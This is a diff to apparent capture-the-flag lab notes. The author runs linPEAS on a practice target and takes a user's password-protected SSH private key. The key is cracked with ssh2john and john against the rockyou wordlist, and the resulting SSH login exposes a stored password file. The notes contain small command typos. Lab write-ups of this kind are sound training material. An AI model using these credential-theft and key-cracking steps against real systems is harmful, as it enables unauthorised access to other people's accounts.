@@ -23,4 +23,21 @@ found: armando
 
 ssh jan@10.10.69.33
 ls home -> cd to kay -> ls
-I could just vi the pass.bak but they want you to use https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+I could just vi the pass.bak but they want you to use linPEAS:
+on local:
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpease.sh
+scp ./linpeas.sh jan@10.10.69.33:/tmp
+on remote:
+cd /tmp
+chmod +x linpeas.sh
+./linpeas.sh | tee lin.log
+
+find RSA in /home/kay/.ssh
+copy the private key to local machine and give "chmod 600" permissions
+we can't use it as is because it is password protected -> ssh2john kay_idrsa > john.cracked
+john john.cracked --wordlist=./rockyou.txt
+found: beeswax
+
+ssk -i kay_idrsa kay@10.10.69.33
+
+cat pass.bak: heresareallystrongpasswordthatfollowsthepasswordpolicy$$
